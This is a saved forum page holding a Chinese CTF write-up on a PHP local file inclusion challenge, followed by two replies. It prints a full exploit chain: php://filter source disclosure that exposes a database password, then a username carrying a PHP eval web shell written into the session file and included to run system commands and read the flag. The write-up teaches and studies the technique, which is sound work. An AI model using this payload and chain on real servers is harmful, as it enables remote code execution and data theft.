+}
+
+.en-markup-crop-options div div:first-of-type {
+    margin-left: 0px !important;
+}
+</style><script id="-forum-static-editor-md-lib-codemirror-modes-min" type="text/javascript" src="./一道CTF题：PHP文件包含_files/modes.min.js"></script><script id="-forum-static-editor-md-lib-codemirror-addons-min" type="text/javascript" src="./一道CTF题：PHP文件包含_files/addons.min.js"></script><script id="-forum-static-editor-md-lib-marked-min" type="text/javascript" src="./一道CTF题：PHP文件包含_files/marked.min.js"></script><script id="-forum-static-editor-md-lib-prettify-min" type="text/javascript" src="./一道CTF题：PHP文件包含_files/prettify.min.js"></script><script type="text/javascript" src="chrome-extension://pioclpoplcdbaefihamjohnefbikjilc/content/frame.js"></script><link id="clearly_highlighting_css" href="chrome-extension://pioclpoplcdbaefihamjohnefbikjilc/clearly/highlight/css/style.css" rel="stylesheet" type="text/css"><link id="clearly_highlighting_css_images" href="chrome-extension://pioclpoplcdbaefihamjohnefbikjilc/clearly/highlight/css/images.css" rel="stylesheet" type="text/css"></head>
+<body class="">
+<!-- navbar begin -->
+<div class="navbar navbar-default">
+    <div class="navbar-inner">
+        <div class="container" style="text-align: center">
+            <!--[if lte IE 8]>
+            <span style="display:inline-block;margin:0 auto;color:red;">为了更好的体验，请使用IE10及以上版本</span>
+            <![endif]-->
+         <!--   <a class="brand"
+               href="/forum/">
+            </a>  -->
+            <a class="brand" href="https://xianzhi.aliyun.com/forum/">
+  <object data="./一道CTF题：PHP文件包含_files/xianzhi_icon.svg" type="image/svg+xml"></object></a>
+            <div class="nav-collapse collapse">
+                <ul class="nav pull-right">
+                    <li>
+                        <form method="get" action="https://xianzhi.aliyun.com/forum/" style="line-height: 20px;margin: 3px 0 0 5px">
+                            
+                                <input type="text" name="keyword" placeholder="搜索相关主题..." style="margin-top:12px">
+                            
+                            <button type="submit" class="btn" style="margin: 0 0 0 5px">搜一搜</button>
+                        </form>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- navbar end -->
+<!-- main content begin -->
+<div id="Wrapper" class="container">
+    
+    
+    <div class="row2">
+        <div class="span10">
+            
+    <div class="row box">
+        <ol class="breadcrumb">
+            <li><a href="https://xianzhi.aliyun.com/forum/tab/1/">技术研究</a></li>
+            <li> /</li>
+            <li><a href="https://xianzhi.aliyun.com/forum/node/13/">CTF</a></li>
+        </ol>
+        
+        <div class="box-container">
+            <div class="clearfix user-info topic-list">
+                
+                    <img class="avatar pull-left" src="./一道CTF题：PHP文件包含_files/default_avatar.png">
+                
+                <p>
+                    
+                    
+                    <span class="topic-title">一道CTF题：PHP文件包含</span>
+                </p>
+                <p class="topic-info">
+                    <a class="label label-default" href="https://xianzhi.aliyun.com/forum/user/2551/">chybeta</a>
+                    <span>发表于:2017-11-13 18:34:47</span>
+                </p>
+                <div class="clearfix topic-title">
+                    
+                    
+                </div>
+            </div>
+
+            <div class="topic-content markdown-body">
+                
+                    <!-- content_hidden 是判断过是否设置内容回复可见和当前访问者是否回复过帖子的一个标志，True为对该用户隐藏   -->
+                    <p></p><p>偶然在水群时看到了几道题，这是其中之一。</p>
+<h1>Task</h1>
+
+<pre><code>http://54.222.188.152:22589/</code></pre>
+<p><img src="./一道CTF题：PHP文件包含_files/4.png"></p>
+<h1>Solution</h1>
+<h2>php伪协议读取源码</h2>
+<p>点击login，发现链接变为：</p>
+
+<pre><code>http://54.222.188.152:22589/index.php
+?action=login.php</code></pre>
+<p>推测文件包含。</p>
+<h3>login.php</h3>
+<p>访问：</p>
+
+<pre><code>http://54.222.188.152:22589/index.php
+?action=php://filter/read=convert.base64-encode/resource=login.php</code></pre>
+<p>得到login.php源码：</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+    <span class="k">require_once</span><span class="p">(</span><span class="s1">'config.php'</span><span class="p">);</span>
+    <span class="nb">session_start</span><span class="p">();</span>
+    <span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'username'</span><span class="p">])</span> <span class="p">{</span>
+        <span class="nb">header</span><span class="p">(</span><span class="s1">'Location: index.php'</span><span class="p">);</span>
+        <span class="k">exit</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">])</span> <span class="p">{</span>
+        <span class="nv">$username</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">];</span>
+        <span class="nv">$password</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]);</span>
+
+        <span class="nv">$mysqli</span> <span class="o">=</span> <span class="o">@</span><span class="k">new</span> <span class="nx">mysqli</span><span class="p">(</span><span class="nv">$dbhost</span><span class="p">,</span> <span class="nv">$dbuser</span><span class="p">,</span> <span class="nv">$dbpass</span><span class="p">,</span> <span class="nv">$dbname</span><span class="p">);</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$mysqli</span><span class="o">-&gt;</span><span class="na">connect_errno</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">die</span><span class="p">(</span><span class="s2">"could not connect to the database:</span><span class="se">\n</span><span class="s2">"</span> <span class="o">.</span> <span class="nv">$mysqli</span><span class="o">-&gt;</span><span class="na">connect_error</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"select password from user where username=?"</span><span class="p">;</span>
+        <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$mysqli</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+        <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bind_param</span><span class="p">(</span><span class="s2">"s"</span><span class="p">,</span> <span class="nv">$username</span><span class="p">);</span>
+        <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bind_result</span><span class="p">(</span><span class="nv">$res_password</span><span class="p">);</span>
+        <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
+
+        <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">();</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$res_password</span> <span class="o">==</span> <span class="nv">$password</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$username</span><span class="p">);</span>
+            <span class="nb">header</span><span class="p">(</span><span class="s2">"location:index.php"</span><span class="p">);</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="k">die</span><span class="p">(</span><span class="s2">"Invalid user name or password"</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">close</span><span class="p">();</span>
+        <span class="nv">$mysqli</span><span class="o">-&gt;</span><span class="na">close</span><span class="p">();</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+<span class="x">&lt;!DOCTYPE html&gt;</span>
+<span class="x">&lt;html&gt;</span>
+<span class="x">&lt;head&gt;</span>
+<span class="x">   &lt;title&gt;Login&lt;/title&gt;</span>
+<span class="x">   &lt;link href="static/bootstrap.min.css" rel="stylesheet"&gt;</span>
+<span class="x">   &lt;script src="static/jquery.min.js"&gt;&lt;/script&gt;</span>
+<span class="x">   &lt;script src="static/bootstrap.min.js"&gt;&lt;/script&gt;</span>
+<span class="x">&lt;/head&gt;</span>
+<span class="x">&lt;body&gt;</span>
+<span class="x">    &lt;div class="container" style="margin-top:100px"&gt;  </span>
+<span class="x">        &lt;form action="login.php" method="post" class="well" style="width:220px;margin:0px auto;"&gt;</span>
+<span class="x">            &lt;h3&gt;Login&lt;/h3&gt;</span>
+<span class="x">            &lt;label&gt;Username:&lt;/label&gt;</span>
+<span class="x">            &lt;input type="text" name="username" style="height:30px"class="span3"/&gt;</span>
+<span class="x">            &lt;label&gt;Password:&lt;/label&gt;</span>
+<span class="x">            &lt;input type="password" name="password" style="height:30px" class="span3"&gt;</span>
+
+<span class="x">            &lt;button type="submit" class="btn btn-primary"&gt;LOGIN&lt;/button&gt;</span>
+<span class="x">        &lt;/form&gt;</span>
+<span class="x">    &lt;/div&gt;</span>
+<span class="x">&lt;/body&gt;</span>
+<span class="x">&lt;/html&gt;</span>
+<span class="cp">&lt;?php</span>
+    <span class="p">}</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+<h3>register.php</h3>
+<p>访问：</p>
+
+<pre><code>http://54.222.188.152:22589/index.php
+?action=php://filter/read=convert.base64-encode/resource=register.php</code></pre>
+<p>register.php:</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">])</span> <span class="p">{</span>
+    <span class="k">require_once</span><span class="p">(</span><span class="s1">'config.php'</span><span class="p">);</span>
+
+    <span class="nv">$username</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">];</span>
+    <span class="nv">$password</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]);</span>
+
+    <span class="nv">$mysqli</span> <span class="o">=</span> <span class="o">@</span><span class="k">new</span> <span class="nx">mysqli</span><span class="p">(</span><span class="nv">$dbhost</span><span class="p">,</span> <span class="nv">$dbuser</span><span class="p">,</span> <span class="nv">$dbpass</span><span class="p">,</span> <span class="nv">$dbname</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$mysqli</span><span class="o">-&gt;</span><span class="na">connect_errno</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s2">"could not connect to the database:</span><span class="se">\n</span><span class="s2">"</span> <span class="o">.</span> <span class="nv">$mysqli</span><span class="o">-&gt;</span><span class="na">connect_error</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="nv">$mysqli</span><span class="o">-&gt;</span><span class="na">set_charset</span><span class="p">(</span><span class="s2">"utf8"</span><span class="p">);</span>
+    <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"select * from user where username=?"</span><span class="p">;</span>
+    <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$mysqli</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+    <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bind_param</span><span class="p">(</span><span class="s2">"s"</span><span class="p">,</span> <span class="nv">$username</span><span class="p">);</span>
+    <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bind_result</span><span class="p">(</span><span class="nv">$res_id</span><span class="p">,</span> <span class="nv">$res_username</span><span class="p">,</span> <span class="nv">$res_password</span><span class="p">);</span>
+    <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
+    <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">store_result</span><span class="p">();</span>
+    <span class="nv">$count</span> <span class="o">=</span> <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">num_rows</span><span class="p">();</span>
+    <span class="k">if</span><span class="p">(</span><span class="nv">$count</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s1">'User name Already Exists'</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"insert into user(username, password) values(?,?)"</span><span class="p">;</span>
+        <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$mysqli</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+        <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bind_param</span><span class="p">(</span><span class="s2">"ss"</span><span class="p">,</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">);</span>
+        <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
+        <span class="k">echo</span> <span class="s1">'Register OK!&lt;a href="index.php"&gt;Please Login&lt;/a&gt;'</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">close</span><span class="p">();</span>
+    <span class="nv">$mysqli</span><span class="o">-&gt;</span><span class="na">close</span><span class="p">();</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+
+<span class="cp">?&gt;</span><span class="x"></span>
+<span class="x">&lt;!DOCTYPE html&gt;</span>
+<span class="x">&lt;html&gt;</span>
+<span class="x">&lt;head&gt;</span>
+<span class="x">   &lt;title&gt;Login&lt;/title&gt;</span>
+<span class="x">   &lt;link href="static/bootstrap.min.css" rel="stylesheet"&gt;</span>
+<span class="x">   &lt;script src="static/jquery.min.js"&gt;&lt;/script&gt;</span>
+<span class="x">   &lt;script src="static/bootstrap.min.js"&gt;&lt;/script&gt;</span>
+<span class="x">&lt;/head&gt;</span>
+<span class="x">&lt;body&gt;</span>
+<span class="x">    &lt;div class="container" style="margin-top:100px"&gt;  </span>
+<span class="x">        &lt;form action="register.php" method="post" class="well" style="width:220px;margin:0px auto;"&gt;</span>
+<span class="x">            &lt;h3&gt;Register&lt;/h3&gt;</span>
+<span class="x">            &lt;label&gt;Username:&lt;/label&gt;</span>
+<span class="x">            &lt;input type="text" name="username" style="height:30px"class="span3"/&gt;</span>
+<span class="x">            &lt;label&gt;Password:&lt;/label&gt;</span>
+<span class="x">            &lt;input type="password" name="password" style="height:30px" class="span3"&gt;</span>
+
+<span class="x">            &lt;button type="submit" class="btn btn-primary"&gt;REGISTER&lt;/button&gt;</span>
+<span class="x">        &lt;/form&gt;</span>
+<span class="x">    &lt;/div&gt;</span>
+<span class="x">&lt;/body&gt;</span>
+<span class="x">&lt;/html&gt;</span>
+<span class="cp">&lt;?php</span>
+    <span class="p">}</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+<h3>config.php</h3>
+<p>访问：</p>
+
+<pre><code>http://54.222.188.152:22589/index.php
+?action=php://filter/read=convert.base64-encode/resource=config.php</code></pre>
+<p>config.php:</p>
+
+<pre><code>&lt;?php
+$dbhost = 'localhost';
+$dbuser = 'web';
+$dbpass = 'webpass123';
+$dbname = 'web';
+ ?&gt;</code></pre>
+<h3>index.php</h3>
+<p>index.php源码：</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="nb">session_start</span><span class="p">();</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'action'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="k">include</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'action'</span><span class="p">];</span>
+    <span class="k">exit</span><span class="p">();</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+
+<span class="x">&lt;!DOCTYPE html&gt;</span>
+<span class="x">&lt;html lang="en"&gt;</span>
+<span class="x">&lt;head&gt;</span>
+<span class="x">    &lt;meta charset="utf-8"&gt;</span>
+<span class="x">    &lt;title&gt;Login&lt;/title&gt;</span>
+<span class="x">    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;</span>
+<span class="x">    &lt;link href="css/bootstrap.css" rel="stylesheet" media="screen"&gt;</span>
+<span class="x">    &lt;link href="css/main.css" rel="stylesheet" media="screen"&gt;</span>
+<span class="x">&lt;/head&gt;</span>
+<span class="x">&lt;body&gt;</span>
+<span class="x">&lt;div class="container"&gt;</span>
+<span class="x">    &lt;div class="form-signin"&gt;</span>
+<span class="x">        </span><span class="cp">&lt;?php</span> <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]))</span> <span class="p">{</span> <span class="cp">?&gt;</span><span class="x"></span>
+<span class="x">            </span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="s2">"&lt;div class=</span><span class="se">\"</span><span class="s2">alert alert-success</span><span class="se">\"</span><span class="s2">&gt;You have been &lt;strong&gt;successfully logged in&lt;/strong&gt;.&lt;/div&gt;</span>
+<span class="s2">&lt;a href=</span><span class="se">\"</span><span class="s2">index.php?action=logout.php</span><span class="se">\"</span><span class="s2"> class=</span><span class="se">\"</span><span class="s2">btn btn-default btn-lg btn-block</span><span class="se">\"</span><span class="s2">&gt;Logout&lt;/a&gt;"</span><span class="p">;}</span><span class="k">else</span><span class="p">{</span> <span class="cp">?&gt;</span><span class="x"></span>
+<span class="x">            </span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="s2">"&lt;div class=</span><span class="se">\"</span><span class="s2">alert alert-warning</span><span class="se">\"</span><span class="s2">&gt;Please Login.&lt;/div&gt;</span>
+<span class="s2">&lt;a href=</span><span class="se">\"</span><span class="s2">index.php?action=login.php</span><span class="se">\"</span><span class="s2"> class=</span><span class="se">\"</span><span class="s2">btn btn-default btn-lg btn-block</span><span class="se">\"</span><span class="s2">&gt;Login&lt;/a&gt;</span>
+<span class="s2">&lt;a href=</span><span class="se">\"</span><span class="s2">index.php?action=register.php</span><span class="se">\"</span><span class="s2"> class=</span><span class="se">\"</span><span class="s2">btn btn-default btn-lg btn-block</span><span class="se">\"</span><span class="s2">&gt;Register&lt;/a&gt;"</span><span class="p">;</span>
+        <span class="p">}</span> <span class="cp">?&gt;</span><span class="x"></span>
+<span class="x">    &lt;/div&gt;</span>
+<span class="x">&lt;/div&gt;</span>
+<span class="x">&lt;/body&gt;</span>
+<span class="x">&lt;/html&gt;</span>
+
+<span class="cp">&lt;?php</span>
+
+<span class="p">}</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+<h2>代码审计</h2>
+<h3>SQL注入？</h3>
+<p>往往注册与登陆操作中会有与数据库交互的地方，这也是sql注入的常见引发点。</p>
+<p>看一下register.php，这里仅截取部分代码：</p>
+<div class="highlight"><pre><span></span><span class="x"># register.php</span>
+
+<span class="x">$mysqli-&gt;set_charset("utf8");</span>
+<span class="x">$sql = "select * from user where username=?";</span>
+<span class="x">$stmt = $mysqli-&gt;prepare($sql);</span>
+<span class="x">$stmt-&gt;bind_param("s", $username);</span>
+<span class="x">$stmt-&gt;bind_result($res_id, $res_username, $res_password);</span>
+<span class="x">$stmt-&gt;execute();</span>
+<span class="x">$stmt-&gt;store_result();</span>
+</pre></div>
+<p>再看一下login.php：</p>
+<div class="highlight"><pre><span></span><span class="x"># login.php</span>
+
+<span class="x">$sql = "select password from user where username=?";</span>
+<span class="x">$stmt = $mysqli-&gt;prepare($sql);</span>
+<span class="x">$stmt-&gt;bind_param("s", $username);</span>
+<span class="x">$stmt-&gt;bind_result($res_password);</span>
+<span class="x">$stmt-&gt;execute();</span>
+<span class="x">$stmt-&gt;fetch();</span>
+</pre></div>
+<p>这里都使用了PHP的PDO处理，因此这里存在sql注入的可能性很小。</p>
+<h3>Session</h3>
+<p>接着再看看，有哪些参数是可控的。</p>
+<p>在login.php中：</p>
+<div class="highlight"><pre><span></span><span class="x"># 第3行</span>
+<span class="x">session_start();</span>
+<span class="x">if($_SESSION['username']) {</span>
+<span class="x">    header('Location: index.php');</span>
+<span class="x">    exit;</span>
+<span class="x">}</span>
+<span class="x"># 第8行</span>
+<span class="x">if($_POST['username'] &amp;&amp; $_POST['password']) {</span>
+<span class="x">    $username = $_POST['username'];</span>
+
+<span class="x"># 第20行</span>
+<span class="x">    $stmt-&gt;bind_result($res_password);</span>
+<span class="x"># 第24行</span>
+<span class="x">    if ($res_password == $password) {</span>
+<span class="x">        $_SESSION['username'] = base64_encode($username);</span>
+<span class="x">        header("location:index.php");</span>
+</pre></div>
+<p>这里使用了session来保存用户会话，<a href="http://php.net/manual/zh/session.examples.basic.php" target="_blank">php手册</a>中是这样描述的：</p>
+<ol>
+<li>PHP 会将会话中的数据设置到 <code>$_SESSION</code> 变量中。</li>
+<li>当 PHP 停止的时候，它会自动读取 <code>$_SESSION</code> 中的内容，并将其进行序列化，然后发送给会话保存管理器来进行保存。</li>
+<li>对于文件会话保存管理器，会将会话数据保存到配置项 session.save_path 所指定的位置。</li>
+</ol>
+<p>考虑到变量<code>$username</code>是我们可控的，并且被设置到了<code>$_SESSION</code>中，因此我们输入的数据未经过滤的就被写入到了对应的sessioin文件中。结合前面的php文件包含，可以推测这里可以包含session文件。关于session包含的相关知识，可以见这篇文章<a href="https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/#%E5%8C%85%E5%90%ABsession" target="_blank">chybeta:PHP文件包含</a></p>
+<p>要包含session文件，需要知道文件的路径。先注册一个用户，比如chybeta。等登陆成功后。记录下cookie中的PHPSESSID的值，这里为udu8pr09fjvabtoip8icgurt85<br>
+<img src="./一道CTF题：PHP文件包含_files/7.png"></p>
+<p>访问：</p>
+
+<pre><code>http://54.222.188.152:22589/index.php?action=/var/lib/php5/sess_udu8pr09fjvabtoip8icgurt85</code></pre>
+<p><img src="./一道CTF题：PHP文件包含_files/6.png"></p>
+<p>这个<code>/var/lib/php5/</code>的session文件路径是测试出来的，常见的也就如<a href="https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/#%E5%8C%85%E5%90%ABsession" target="_blank">chybeta:PHP文件包含</a>中所述的几种。</p>
+<h3>base64_encode</h3>
+<p>能包含，并且控制session文件，但要写入可用的payload，还需要绕过：</p>
+
+<pre><code>$_SESSION['username'] = base64_encode($username);</code></pre>
+<p>如前面所示，输入的用户名会被base64加密。如果直接用php伪协议来解密整个session文件，由于序列化的前缀，势必导致乱码。</p>
+<p>考虑一下base64的编码过程。比如编码abc。</p>
+
+<pre><code>未编码: abc
+转成ascii码： 97 98 99
+转成对应二进制（三组，每组8位）： 01100001 01100010 01100011
+重分组（四组，每组6位）： 011000 010110 001001 100011
+每组高位补零，变为每组8位：00011000 00010110 00001001 00100011
+每组对应转为十进制： 24 22 9 35
+查表得： Y W J j</code></pre>
+<p>考虑一下session的前缀：<code>username|s:12:"</code>，中间的数字12表示后面base64串的长度。当base64串的长度小于100时，前缀的长度固定为15个字符，当base64串的长度大于100小于1000时，前缀的长度固定为16个字符。</p>
+<p>由于16个字符，恰好满足一下条件：</p>
+
+<pre><code>16个字符 =&gt; 16 * 6 = 96 位 =&gt; 96 mod 8 = 0</code></pre>
+<p>也就是说，当对session文件进行base64解密时，前16个字符固然被解密为乱码，但不会再影响从第17个字符后的部分也就是base64加密后的username。</p>
+<h2>Get Flag</h2>
+<p>注册一个账号，比如：</p>
+
+<pre><code>chybetachybetachybetachybetachybetachybetachybetachybetachybeta&lt;?php eval($_GET['atebyhc']) ?&gt;</code></pre>
+<p>其base64加密后的长度为128，大于100。<br>
+<img src="./一道CTF题：PHP文件包含_files/8.png"></p>
+
+<pre><code>http://54.222.188.152:22589/index.php
+?action=php://filter/read=convert.base64-decode/resource=/var/lib/php5/sess_udu8pr09fjvabtoip8icgurt85
+&amp;atebyhc=phpinfo();</code></pre>
+<p><img src="./一道CTF题：PHP文件包含_files/9.png"><br>
+成功getshell。</p>
+<p>访问：</p>
+
+<pre><code>http://54.222.188.152:22589/index.php?action=php://filter/read=convert.base64-decode/resource=/var/lib/php5/sess_udu8pr09fjvabtoip8icgurt85&amp;atebyhc=system('ls /');</code></pre>
+<p><img src="./一道CTF题：PHP文件包含_files/10.png"></p>
+<p>访问:</p>
+
+<pre><code>http://54.222.188.152:22589/index.php?action=php://filter/read=convert.base64-decode/resource=/var/lib/php5/sess_udu8pr09fjvabtoip8icgurt85&amp;atebyhc=system('cat /fffflllllaaaagggg.txt');</code></pre>
+<p><img src="./一道CTF题：PHP文件包含_files/11.png"></p>
+<h1>小结</h1>
+<p>考了几个知识点：</p>
+<ol>
+<li>php文件包含：伪协议利用</li>
+<li>php文件包含：包含session文件</li>
+<li>php-session知识及序列化格式</li>
+<li>base64的基本原理</li>
+</ol>
+<p></p>
+                    
+                
+            </div>
+            
+            <span class="pull-right thumbs collection" data-action="topic" data-pk="1576">
+                
+                    <i class="fa fa-star"></i><span>1</span>
+                
+            </span>
+        </div>
+    </div>
+    
+    <!-- topic & appendix -->
+    
+
+
+
+<div class="row box">
+    <ol class="breadcrumb">
+        <li class="active">2 条回复</li>
+    </ol>
+    <div class="box-container">
+        
+            
+                <ul id="reply-7283">
+                    <li style="min-height: 30px">
+                        <div class="row1 user-info clearfix"> <!-- user info -->
+                             <!--有头像载入头像，没有头像载入默认头像 -->
+                                <img class="avatar pull-left" src="./一道CTF题：PHP文件包含_files/2512_c44173bb6936ee311e.png">
+                            
+
+                            <span class="post-info ">
+                                 
+                                <a class="label label-default" href="https://xianzhi.aliyun.com/forum/user/2512/">wooy0ung6</a>
+                                <span>发表于：2017-11-14 09:22:54</span>
+                            </span>
+                            <span class="reply-jump reply reply-cont pull-right" data-nickname="wooy0ung6">回复Ta</span>
+                            <span class="thumbs pull-right" data-action="post" data-pk="7283" data-topic="1576">
+                                <i class="fa fa-thumbs-o-up"></i><span>0</span>
+                            </span>
+
+                            <div class="post-content markdown-body">
+                                <p><a href="https://xianzhi.aliyun.com/forum/user/2551/">@chybeta</a> 总结的很到位 很完整</p>
+
+                            </div>
+                        </div>
+                        
+                        <hr>
+                    </li>
+                </ul>
+
+            
+                <ul id="reply-7330">
+                    <li style="min-height: 30px">
+                        <div class="row1 user-info clearfix"> <!-- user info -->
+                            
+                                <img class="avatar pull-left" src="./一道CTF题：PHP文件包含_files/default_avatar.png">
+                            
+
+                            <span class="post-info ">
+                                 
+                                <a class="label label-default" href="https://xianzhi.aliyun.com/forum/user/4576/">sq1map</a>
+                                <span>发表于：2017-11-18 19:52:58</span>
+                            </span>
+                            <span class="reply-jump reply reply-cont pull-right" data-nickname="sq1map">回复Ta</span>
+                            <span class="thumbs pull-right" data-action="post" data-pk="7330" data-topic="1576">
+                                <i class="fa fa-thumbs-o-up"></i><span>0</span>
+                            </span>
+
+                            <div class="post-content markdown-body">
+                                <p>1.php-session知识及序列化格式<br>
+2.base64的基本原理<br>
+这2点都没接触过，看完才知道自己有多菜，感谢分享！</p>
+
+                            </div>
+                        </div>
+                        
+                        <hr>
+                    </li>
+                </ul>
+
+            
+        
+    </div>
+</div>
+<div class="modal-box hidden"></div>
+<div class="modal-confirm hidden post-confirm">
+    <div class="confirm-info">
+        确定<span></span>吗
+    </div>
+    <button class="btn btn-danger sure">确定</button>
+    <button class="btn btn-default cancel">取消</button>
+</div>
+
+    <!-- posts of topic -->
+    
+        <div class="row box" id="reply-box">
+            
+            <div class="box-container clearfix">
+                
+                    <form action="https://xianzhi.aliyun.com/forum/topic/1576/" method="post">
+                        <input type="hidden" name="csrfmiddlewaretoken" value="feSc4fIAIiFX9F51P1Zhiz4wVORY1BGdSjHFLTYZjdYp74u2gBvRFnwI8InuQaTD">
+                        <p id="editormd" class="editormd editormd-vertical" style="width: 100%; height: 500px;"> <textarea class="topic-form editormd-markdown-textarea" cols="40" id="id_content" maxlength="10000" name="content" rows="10" required="" placeholder="说点什么吧..." style="display: none;"></textarea><div class="CodeMirror cm-s-default CodeMirror-wrap CodeMirror-empty" style="font-size: 13px; width: 660px; margin-top: 78px; height: 423px;"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 51px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" style="position: absolute; padding: 0px; width: 1000px; height: 1em; outline: none;" tabindex="0"></textarea></div><div class="CodeMirror-vscrollbar" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" cm-not-content="true"><div style="height: 100%; min-height: 1px; width: 0px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 39px; margin-bottom: -7px; border-right-width: 23px; min-height: 30px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines"><div style="position: relative; outline: none;"><pre class="CodeMirror-placeholder" style="height: 0px; overflow: visible;">说点什么吧...</pre><div class="CodeMirror-measure"><span><span>​</span>x</span></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor" style="left: 12px; top: 0px; height: 22px;">&nbsp;</div></div><div class="CodeMirror-code"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-wrapper" style="left: -39px; width: 39px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 20px;">1</div></div><pre class=""><span style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 23px; width: 1px; top: 30px;"></div><div 